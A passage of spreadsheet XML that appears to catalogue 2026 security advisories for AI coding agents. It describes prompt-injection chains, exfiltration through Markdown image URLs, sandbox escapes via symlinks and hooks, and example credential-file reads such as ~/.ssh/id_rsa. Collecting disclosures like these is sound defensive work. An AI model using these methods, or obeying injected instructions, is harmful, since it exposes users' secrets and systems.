      </c>
      <c r="B143" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C143" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D143" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E143" s="8" t="inlineStr">
        <is>
          <t>2026-05-28</t>
        </is>
      </c>
      <c r="F143" s="9" t="inlineStr">
        <is>
          <t>CodeWhale: task_create Insecure Defaults Enable RCE via Prompt Injection in Project Files</t>
        </is>
      </c>
      <c r="G143" s="9" t="inlineStr">
        <is>
          <t>CodeWhale is a DeepSeek + MiMo coding agent in terminal. Prior to 0.8.26, the task_create tool spawns durable sub-agents that inherit two insecure defaults, allow_shell defaults to true (config.rs:1499: self.allow_shell.unwrap_or(true)) and auto_approve defaults to true (task_manager.rs:297: auto_approve: Some(true)). When a user approves a task_create call (which requires ApprovalRequirement::Required), they approve what appears to be a benign work prompt. However, the spawned sub-agent silently receives unrestricted, unapproved shell access. This vulnerability is fixed in 0.8.26.</t>
        </is>
      </c>
      <c r="H143" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-45374</t>
        </is>
      </c>
    </row>
    <row r="144">
      <c r="A144" s="8" t="inlineStr">
        <is>
          <t>CA-136</t>
        </is>
      </c>
      <c r="B144" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C144" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D144" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E144" s="8" t="inlineStr">
        <is>
          <t>2026-05-31</t>
        </is>
      </c>
      <c r="F144" s="9" t="n"/>
      <c r="G144" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was identified in Aider-AI Aider 0.86.3. Affected is an unknown function of the file aider/args.py of the component Pre-commit Hook Handler. Such manipulation of the argument git-commit-verify leads to protection mechanism failure. The attack may be launched remotely. The exploit is publicly available and might be used. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H144" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-c3wr-3c4v-6rmh</t>
        </is>
      </c>
    </row>
    <row r="145">
      <c r="A145" s="8" t="inlineStr">
        <is>
          <t>CA-137</t>
        </is>
      </c>
      <c r="B145" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C145" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D145" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E145" s="8" t="inlineStr">
        <is>
          <t>2026-05-31</t>
        </is>
      </c>
      <c r="F145" s="9" t="inlineStr">
        <is>
          <t>Aider is vulnerable to Code Injection via editor_coder.run function</t>
        </is>
      </c>
      <c r="G145" s="9" t="inlineStr">
        <is>
          <t>A security flaw has been discovered in Aider-AI Aider 0.86.3.dev. Affected by this vulnerability is the function editor_coder.run of the file auth.py of the component Architect Mode. Performing a manipulation results in code injection. Remote exploitation of the attack is possible. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H145" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7w7m-v5vp-w699</t>
        </is>
      </c>
    </row>
    <row r="146">
      <c r="A146" s="8" t="inlineStr">
        <is>
          <t>CA-138</t>
        </is>
      </c>
      <c r="B146" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C146" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D146" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E146" s="8" t="inlineStr">
        <is>
          <t>2026-05-31</t>
        </is>
      </c>
      <c r="F146" s="9" t="n"/>
      <c r="G146" s="9" t="inlineStr">
        <is>
          <t>A weakness has been identified in Aider-AI Aider 0.86.3. Affected by this issue is some unknown functionality of the component Code Generation Workflow. Executing a manipulation can lead to sql injection. The attack can be executed remotely. The exploit has been made available to the public and could be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H146" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-f9g4-qjmq-f49r</t>
        </is>
      </c>
    </row>
    <row r="147">
      <c r="A147" s="8" t="inlineStr">
        <is>
          <t>CA-139</t>
        </is>
      </c>
      <c r="B147" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C147" s="8" t="inlineStr">
        <is>
          <t>Aider</t>
        </is>
      </c>
      <c r="D147" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E147" s="8" t="inlineStr">
        <is>
          <t>2026-05-31</t>
        </is>
      </c>
      <c r="F147" s="9" t="inlineStr">
        <is>
          <t>Aider has an SSRF vulnerability through its AWS EC2 Metadata Endpoint</t>
        </is>
      </c>
      <c r="G147" s="9" t="inlineStr">
        <is>
          <t>A security vulnerability has been detected in Aider-AI Aider 0.86.3.dev. This affects the function requests.get of the file api_docs.py of the component AWS EC2 Metadata Endpoint. The manipulation leads to server-side request forgery. The attack is possible to be carried out remotely. The exploit has been disclosed publicly and may be used. It is suggested to install a patch to address this issue. The pull request to fix this issue awaits acceptance.</t>
        </is>
      </c>
      <c r="H147" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hchg-qm84-cj9p</t>
        </is>
      </c>
    </row>
    <row r="148">
      <c r="A148" s="8" t="inlineStr">
        <is>
          <t>CA-140</t>
        </is>
      </c>
      <c r="B148" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C148" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D148" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E148" s="8" t="inlineStr">
        <is>
          <t>2026-06-02</t>
        </is>
      </c>
      <c r="F148" s="9" t="n"/>
      <c r="G148" s="9" t="inlineStr">
        <is>
          <t>Insufficient access control restrictions in the file write tool in Amazon Kiro IDE before version 0.11 might allow remote unauthenticated actors to execute arbitrary commands via crafted instructions that cause writes to execution-sensitive paths  (such as .vscode/tasks.json), enabling auto-execution on folder open.    To remediate this issue, users should upgrade to Kiro IDE version 0.11 or later.</t>
        </is>
      </c>
      <c r="H148" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-83m8-c7v3-rw3w</t>
        </is>
      </c>
    </row>
    <row r="149">
      <c r="A149" s="8" t="inlineStr">
        <is>
          <t>CA-142</t>
        </is>
      </c>
      <c r="B149" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C149" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D149" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E149" s="8" t="inlineStr">
        <is>
          <t>2026-06-10</t>
        </is>
      </c>
      <c r="F149" s="9" t="inlineStr">
        <is>
          <t>Claude Code Action: Malicious MCP Server Configuration in PRs Enables Remote Code Execution and Secret Exfiltration</t>
        </is>
      </c>
      <c r="G149" s="9" t="inlineStr">
        <is>
          <t>Due to the combination of checking out PR head branches (attacker-controlled), reading `.mcp.json` from the working directory via default setting sources, and unconditionally enabling all project MCP servers via `enableAllProjectMcpServers`, it was possible for an attacker who opened a PR containing a malicious `.mcp.json` file to achieve arbitrary code execution on the GitHub Actions runner. This could lead to exfiltration of secrets available to the workflow (such as API keys and tokens) when a privileged user triggered the Claude action on the PR. Exploiting this required the ability to open a pull request against a repository using the claude-code-action and a privileged user or automatic trigger to invoke the action on that PR.  Users pinned to a vulnerable version of claude-code-action are advised to update to the latest version. Users referencing anthropics/claude-code-action@v1, anthropics/claude-code-action@beta, anthropics/claude-code-action@main, or other non-pinned tags will have received this fix already  Claude Code thanks hackerone.com/reptou for reporting this issue.</t>
        </is>
      </c>
      <c r="H149" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-8q5r-mmjf-575q</t>
        </is>
      </c>
    </row>
    <row r="150">
      <c r="A150" s="8" t="inlineStr">
        <is>
          <t>CA-143</t>
        </is>
      </c>
      <c r="B150" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C150" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D150" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E150" s="8" t="inlineStr">
        <is>
          <t>2026-06-15</t>
        </is>
      </c>
      <c r="F150" s="9" t="n"/>
      <c r="G150" s="9" t="inlineStr">
        <is>
          <t>Incorrect default permissions in Kiro IDE on macOS and Linux before version 0.11.133 could expose the authentication token cache file to other local users or processes via world-readable permissions (0644) instead of owner-restricted permissions (0600).    To remediate this issue, users should upgrade to Kiro IDE version 0.11.133 or later. After upgrading and restarting the application, the cache file permissions are automatically updated on the next token refresh. Users operating in a multi-user environment can invalidate existing tokens by reauthenticating.</t>
        </is>
      </c>
      <c r="H150" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vjw4-v5gx-3v45</t>
        </is>
      </c>
    </row>
    <row r="151">
      <c r="A151" s="8" t="inlineStr">
        <is>
          <t>CA-144</t>
        </is>
      </c>
      <c r="B151" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C151" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D151" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E151" s="8" t="inlineStr">
        <is>
          <t>2026-06-15</t>
        </is>
      </c>
      <c r="F151" s="9" t="inlineStr">
        <is>
          <t>Cursor Desktop sandbox escape via Claude hook configuration</t>
        </is>
      </c>
      <c r="G151" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions prior to 3.0.0, the Cursor Desktop could execute workspace-defined Claude hook commands from .claude/settings.local.json without dedicated user approval. A malicious workspace or agent-created file could configure hooks that run local commands in the user's context when an agent turn ends. This could allow sandbox escape, persistence across turns, local data access, or follow-on compromise. This issue has been fixed in version 3.0.0.</t>
        </is>
      </c>
      <c r="H151" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-48124</t>
        </is>
      </c>
    </row>
    <row r="152">
      <c r="A152" s="8" t="inlineStr">
        <is>
          <t>CA-146</t>
        </is>
      </c>
      <c r="B152" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C152" s="8" t="inlineStr">
        <is>
          <t>Gemini CLI</t>
        </is>
      </c>
      <c r="D152" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E152" s="8" t="inlineStr">
        <is>
          <t>2026-06-18</t>
        </is>
      </c>
      <c r="F152" s="9" t="inlineStr">
        <is>
          <t>gemini-mcp-tool vulnerable to OS command injection and @file exfiltration via prompt quoting (CVE-2026-0755)</t>
        </is>
      </c>
      <c r="G152" s="9" t="inlineStr">
        <is>
          <t>Untrusted prompt input could reach the Gemini CLI @file parser, allowing read/exfiltration of arbitrary local files (@/etc/passwd, @~/.ssh/id_rsa, @../../secret). On Windows, unquoted cmd.exe metacharacters could break out into OS command injection.  Fix (1.1.6): removed the broken shell:false double-quote wrapping; added assertSafeFileReferences() to contain @file refs to the working directory; hardened Windows cmd.exe argument quoting.</t>
        </is>
      </c>
      <c r="H152" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-4h5r-5jm8-jxjm</t>
        </is>
      </c>
    </row>
    <row r="153">
      <c r="A153" s="8" t="inlineStr">
        <is>
          <t>CA-147</t>
        </is>
      </c>
      <c r="B153" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C153" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D153" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E153" s="8" t="inlineStr">
        <is>
          <t>2026-06-18</t>
        </is>
      </c>
      <c r="F153" s="9" t="inlineStr">
        <is>
          <t>[Eclipse Theia] Data Exfiltration via Markdown Image Rendering in AI Chat</t>
        </is>
      </c>
      <c r="G153" s="9" t="inlineStr">
        <is>
          <t>In Eclipse Theia versions prior to 1.71.0, the AI chat rendered Markdown image tags from AI responses, triggering HTTP requests to arbitrary external URLs without restriction. Combined with prompt injection in a malicious workspace, an attacker could induce the AI agent to construct image URLs encoding sensitive information from the workspace or conversation context, exfiltrating it to attacker-controlled servers. The workspace trust enforcement introduced in v1.71.0 mitigates the documented attack chain by disabling AI features in untrusted workspaces.</t>
        </is>
      </c>
      <c r="H153" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-qwjm-9c66-w4q4</t>
        </is>
      </c>
    </row>
    <row r="154">
      <c r="A154" s="8" t="inlineStr">
        <is>
          <t>CA-148</t>
        </is>
      </c>
      <c r="B154" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C154" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D154" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E154" s="8" t="inlineStr">
        <is>
          <t>2026-06-18</t>
        </is>
      </c>
      <c r="F154" s="9" t="inlineStr">
        <is>
          <t>[Eclipse Theia] Indirect Prompt Injection via Adversarial Workspace File and Directory Names in AI Chat</t>
        </is>
      </c>
      <c r="G154" s="9" t="inlineStr">
        <is>
          <t>In Eclipse Theia versions prior to 1.71.0, the AI chat agent processed workspace file and directory names as part of its prompt context without distinguishing them from system instructions. An attacker could craft a malicious repository with adversarial directory or file names that, when analyzed by the AI agent, would cause the agent to follow attacker-controlled instructions (indirect prompt injection). Combined with other AI chat features available in untrusted workspaces, this enabled attack chains leading to data exfiltration via Markdown image rendering or arbitrary command execution via task definitions.</t>
        </is>
      </c>
      <c r="H154" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3jww-hxqj-wfq2</t>
        </is>
      </c>
    </row>
    <row r="155">
      <c r="A155" s="8" t="inlineStr">
        <is>
          <t>CA-149</t>
        </is>
      </c>
      <c r="B155" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C155" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D155" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E155" s="8" t="inlineStr">
        <is>
          <t>2026-06-18</t>
        </is>
      </c>
      <c r="F155" s="9" t="inlineStr">
        <is>
          <t>[Eclipse Theia] Indirect Prompt Injection via Auto-Loaded Workspace Prompt Template Files in AI Chat</t>
        </is>
      </c>
      <c r="G155" s="9" t="inlineStr">
        <is>
          <t>In Eclipse Theia versions prior to 1.71.0, files matching the pattern .prompts/*.prompttemplate in a workspace were automatically loaded and could override or extend the AI agent's system prompts. An attacker could craft a malicious repository containing prompt template files that, when the workspace was opened in Theia, replaced the AI's system instructions with attacker-controlled content (indirect prompt injection). Combined with other AI chat features available in untrusted workspaces, this enabled attack chains leading to data exfiltration via Markdown image rendering or arbitrary command execution via task definitions.</t>
        </is>
      </c>
      <c r="H155" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-m973-pr9r-hp2w</t>
        </is>
      </c>
    </row>
    <row r="156">
      <c r="A156" s="8" t="inlineStr">
        <is>
          <t>CA-150</t>
        </is>
      </c>
      <c r="B156" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C156" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D156" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E156" s="8" t="inlineStr">
        <is>
          <t>2026-06-18</t>
        </is>
      </c>
      <c r="F156" s="9" t="inlineStr">
        <is>
          <t>AgenticMail: Unauthenticated inbound mail triggers bypassPermissions resume of the operator's Claude Code session (bridge-wake)</t>
        </is>
      </c>
      <c r="G156" s="9" t="inlineStr">
        <is>
          <t>## Summary Two inbound-mail handlers act on a privileged effect without verifying that the sender is the operator, while a sibling handler in the same repo does. The higher-impact one: any external email routed to the bridge inbox causes the dispatcher to resume the operator's Claude Code session with `permissionMode: 'bypassPermissions'`, embedding the attacker-controlled `from`/`subject`/`preview` verbatim into the prompt the resumed agent reads — an indirect prompt injection into a fully-privileged agent (Bash/Write/Edit/WebFetch + the agenticmail MCP toolbelt) running as the operator's OAuth identity. The sibling operator-query email-reply hook gates the same untrusted-From provenance with `isOperatorReplySender(replyFrom, config.operatorEmail)` (fail-closed); the bridge-wake path — a strictly higher-privilege effect — has no equivalent.  ## Affected code (current HEAD, commit b95f52e) Untrusted provenance: external inbound email enters at `packages/api/src/routes/inbound.ts:41` (POST /mail/inbound); the `x-inbound-secret` authenticates only the relay-&gt;API hop, not the external sender, so `from`/`subject`/`preview` are attacker-controlled.  Privileged sink (bridge-wake, bypassPermissions): - `packages/claudecode/src/dispatcher.ts:2040` `handleBridgeMail` extracts `subject`/`from`/`preview` (`:2045-2049`) and calls `planBridgeWake({ session, mail: { ..., from, preview } })` (`:2052`) with NO sender check — routing keys only on session freshness (skip-live / escalate / resume). - `planBridgeWake` -&gt; `packages/core/src/host-bridge.ts:141` `composeBridgeWakePrompt` embeds the untrusted `from`/`subject`/`preview` (preview sliced to 600 chars at `:144`) verbatim into the prompt. - `packages/claudecode/src/bridge-wake.ts:103` `resumeBridgeSession` runs the prompt via the Claude Code SDK with `permissionMode: 'bypassPermissions'` against the operator's last session (resume + same mcpServers).  Guarded sibling (same class, authenticated): `packages/api/src/routes/inbound.ts:102` rejects an operator-query email reply unless `isOperatorReplySender(replyFrom, config.operatorEmail)` (def `packages/core/src/phone/realtime-tools.ts:999`, fail-closed when no operatorEmail), with a v0.9.53 security-review comment (`inbound.ts:93-100`) stating inbound mail provenance is untrusted and an emailed answer is only honored when its From matches the configured operator. The Telegram sibling likewise gates on `operatorChatId`. The bridge-wake path ignores this exact lesson.  Secondary instance (same root cause): `packages/core/src/gateway/manager.ts:261` `tryProcessApprovalReply` releases a held outbound email on an "approve" reply matched only by `In-Reply-To` / `notification_message_id`, with no sender check — again unlike the `isOperatorReplySender` sibling.  ## Impact In a configured headless-bridge deployment (operator uses the CLI so a host-session is saved; session fresh &lt;24h per `host-sessions.ts:127`; external mail routed to the bridge inbox via relay sub-add</t>
        </is>
      </c>
      <c r="H156" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-fq4x-789w-jg5h</t>
        </is>
      </c>
    </row>
    <row r="157">
      <c r="A157" s="8" t="inlineStr">
        <is>
          <t>CA-151</t>
        </is>
      </c>
      <c r="B157" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C157" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D157" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E157" s="8" t="inlineStr">
        <is>
          <t>2026-06-19</t>
        </is>
      </c>
      <c r="F157" s="9" t="n"/>
      <c r="G157" s="9" t="inlineStr">
        <is>
          <t>Initialization of a resource with an insecure default in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to disclose information over a network.</t>
        </is>
      </c>
      <c r="H157" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2gq4-362c-56w9</t>
        </is>
      </c>
    </row>
    <row r="158">
      <c r="A158" s="8" t="inlineStr">
        <is>
          <t>CA-152</t>
        </is>
      </c>
      <c r="B158" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C158" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D158" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E158" s="8" t="inlineStr">
        <is>
          <t>2026-06-22</t>
        </is>
      </c>
      <c r="F158" s="9" t="n"/>
      <c r="G158" s="9" t="inlineStr">
        <is>
          <t>GitHub Copilot 1.372.0 allows filesystem access outside of a workspace folder (without user approval) via a file-handler URI parameter to fetch_webpage. Therefore, exfiltration could occur if there is indirect prompt injection.</t>
        </is>
      </c>
      <c r="H158" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7vc2-x95v-g6m9</t>
        </is>
      </c>
    </row>
    <row r="159">
      <c r="A159" s="8" t="inlineStr">
        <is>
          <t>CA-154</t>
        </is>
      </c>
      <c r="B159" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C159" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D159" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E159" s="8" t="inlineStr">
        <is>
          <t>2026-06-24</t>
        </is>
      </c>
      <c r="F159" s="9" t="inlineStr">
        <is>
          <t>chrome-devtools-mcp: validatePath() does not canonicalize symlinks before enforcing roots</t>
        </is>
      </c>
      <c r="G159" s="9" t="inlineStr">
        <is>
          <t>Chrome DevTools for agents (chrome-devtools-mcp) lets your coding agent control and inspect a live Chrome browser. From 0.24.0 until 1.1.0, McpContext.validatePath() enforces workspace roots by checking whether path.resolve(filePath) textually falls under one of the configured root paths. path.resolve() does not canonicalize symbolic links. As a result, a symlink inside a configured workspace root can point to a file outside that root, pass validation, and then be followed by downstream file read/write operations. This bypass applies even when the MCP client correctly declares the roots capability with a non-empty list. It is separate from the documented legacy behavior where missing roots capability allows all paths. The practical impact is a workspace-boundary bypass. In the write direction, filePath-writing tools can overwrite out-of-root files through an in-root symlink. In the read direction, upload_file can read through the symlink and send the file to the currently selected web page. This vulnerability is fixed in 1.1.0.</t>
        </is>
      </c>
      <c r="H159" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-53766</t>
        </is>
      </c>
    </row>
    <row r="160">
      <c r="A160" s="8" t="inlineStr">
        <is>
          <t>CA-155</t>
        </is>
      </c>
      <c r="B160" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C160" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D160" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E160" s="8" t="inlineStr">
        <is>
          <t>2026-06-25</t>
        </is>
      </c>
      <c r="F160" s="9" t="inlineStr">
        <is>
          <t>@anthropic-ai/claude-code has an Insecure Temporary File in /copy Command that Enables Response Disclosure and Symlink-Based File Write</t>
        </is>
      </c>
      <c r="G160" s="9" t="inlineStr">
        <is>
          <t>The Claude Code `/copy` command wrote responses to a hardcoded, predictable path (`/tmp/claude/response.md`) without UID isolation, randomness, or symlink protection. The file was created world-readable (0644) in a world-traversable directory (0755), allowing any local user to read a privileged user's Claude response, which could contain secrets or credentials. Additionally, because the path was static and predictable, a local attacker could pre-create the directory and plant a symlink at the expected file path, causing the privileged process to follow the symlink and overwrite an attacker-chosen file with the response text. Exploiting this required a local unprivileged user on the same system and a privileged user to run the `/copy` command.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Claude Code thanks hackerone.com/c_h4ck_0 for reporting this issue.</t>
        </is>
      </c>
      <c r="H160" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-4vp2-6q8c-pvq2</t>
        </is>
      </c>
    </row>
    <row r="161">
      <c r="A161" s="8" t="inlineStr">
        <is>
          <t>CA-157</t>
        </is>
      </c>
      <c r="B161" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C161" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D161" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E161" s="8" t="inlineStr">
        <is>
          <t>2026-06-25</t>
        </is>
      </c>
      <c r="F161" s="9" t="inlineStr">
        <is>
          <t>Cursor Desktop sandbox escape via symlink and failed path canonicalization</t>
        </is>
      </c>
      <c r="G161" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 3.0, Cursor runs agent terminal commands in a sandbox by default. Before a Write, the agent canonicalizes the target path to confirm it stays inside the workspace, but when canonicalization fails it falls back to the original path and writes without approval. A malicious agent can create an in-workspace symlink that points outside the workspace and force canonicalization to fail — either because the target does not exist or because read permission is removed from the path — so the agent writes through the symlink to an arbitrary location without approval. A malicious agent could write arbitrary files outside the workspace under the user's privileges. This enables non-sandboxed Remote Code Execution — for example by overwriting the cursorsandbox helper so later commands run unsandboxed — with no user interaction beyond a benign prompt. This vulnerability is fixed in 3.0.</t>
        </is>
      </c>
      <c r="H161" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-50549</t>
        </is>
      </c>
    </row>
    <row r="162">
      <c r="A162" s="8" t="inlineStr">
        <is>
          <t>CA-158</t>
        </is>
      </c>
      <c r="B162" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C162" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D162" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E162" s="8" t="inlineStr">
        <is>
          <t>2026-07-01</t>
        </is>
      </c>
      <c r="F162" s="9" t="inlineStr">
        <is>
          <t>Cortex has Untrusted Project Bootstrap Code Execution via `CLAUDE_PROJECT_DIR`</t>
        </is>
      </c>
      <c r="G162" s="9" t="inlineStr">
        <is>
          <t>## Untrusted Project Bootstrap Code Execution via `CLAUDE_PROJECT_DIR`  ### Summary  The Cortex MCP server (`neuro-cortex-memory`) treats the `CLAUDE_PROJECT_DIR` environment variable — automatically set by Claude Code to the currently open project directory — as a trusted Cortex developer checkout. When the `open_visualization` tool is invoked, `_find_dev_source()` resolves the user's active project directory as a candidate Cortex source root. The only validation performed by `_is_cortex_root()` is a check for the presence of an `mcp_server/` subdirectory and a `ui/unified-viz.html` file. An attacker who places these two marker files in a malicious repository can cause Cortex to execute an arbitrary `mcp_server/server/visualize_bootstrap.py` from that directory via `subprocess.run([sys.executable, ...])`, achieving code execution with the privileges of the victim's local user process. CVSS v3.1 Base Score: **7.8 (High)**.  ### Details  The vulnerability originates in `_find_dev_source()` inside `mcp_server/handlers/open_visualization.py`. The function builds a list of candidate directories by iterating over the environment variables `CORTEX_DEV_ROOT` and `CLAUDE_PROJECT_DIR`:  ```python # mcp_server/handlers/open_visualization.py:73-76 for env in ("CORTEX_DEV_ROOT", "CLAUDE_PROJECT_DIR"):     v = os.environ.get(env)     if v:         candidates.append(Path(v)) ```  `CLAUDE_PROJECT_DIR` is set automatically by the Claude Code IDE extension to whichever directory the user has currently open. This means **any project the user opens** is silently treated as a candidate Cortex source root.  Each candidate is then validated by `_is_cortex_root()` (lines 65–70), which only verifies that the directory contains an `mcp_server/` subdirectory and a `ui/unified-viz.html` file — trivial markers that an attacker can replicate:  ```python # mcp_server/handlers/open_visualization.py:65-70 def _is_cortex_root(path: Path) -&gt; bool:     return (path / "mcp_server").is_dir() and \            (path / "ui" / "unified-viz.html").is_file() ```  There is no git remote identity check, no cryptographic signature verification, no release path allowlist, and no explicit developer opt-in requirement. Once a directory passes `_is_cortex_root()`, the handler constructs a bootstrap path and executes it unconditionally:  ```python # mcp_server/handlers/open_visualization.py:179-185 bootstrap_path = dev_src / "mcp_server" / "server" / "visualize_bootstrap.py" if bootstrap_path.is_file():     ...     proc = subprocess.run(         [sys.executable, str(bootstrap_path)],     ) ```  A secondary code-execution path exists in `mcp_server/server/http_launcher.py:80-83` and `273-275`, where the same `CLAUDE_PROJECT_DIR`-derived dev source is used to `rsync` attacker-controlled files into the Cortex plugin cache directory before serving them.  **Entry point**: MCP tool `open_visualization`, registered at `mcp_server/tool_registry_core.py:194-207` (no authentication required at tool layer).</t>
        </is>
      </c>
      <c r="H162" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-gvpp-v77h-5w8g</t>
        </is>
      </c>
    </row>
    <row r="163">
      <c r="A163" s="8" t="inlineStr">
        <is>
          <t>CA-159</t>
        </is>
      </c>
      <c r="B163" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C163" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D163" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E163" s="8" t="inlineStr">
        <is>
          <t>2026-07-06</t>
        </is>
      </c>
      <c r="F163" s="9" t="n"/>
      <c r="G163" s="9" t="inlineStr">
        <is>
          <t>The OpenAI Codex desktop app for macOS rendered remote images from Markdown in model responses. An attacker who could place an indirect prompt injection in content processed by Codex, such as a connected-tool result or another untrusted source, could induce the model to construct a remote image URL containing sensitive data. The app automatically fetched that URL when rendering the response, sending the embedded data to an attacker-controlled server without a separate user click. Successful exploitation could exfiltrate secrets and other information accessible in the Codex session, including API keys, source code, and data returned by connected tools. No direct integrity or availability impact was demonstrated, and there is no known exploitation in the wild.</t>
        </is>
      </c>
      <c r="H163" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-gj6m-4qqg-3cw8</t>
        </is>
      </c>
    </row>
    <row r="164">
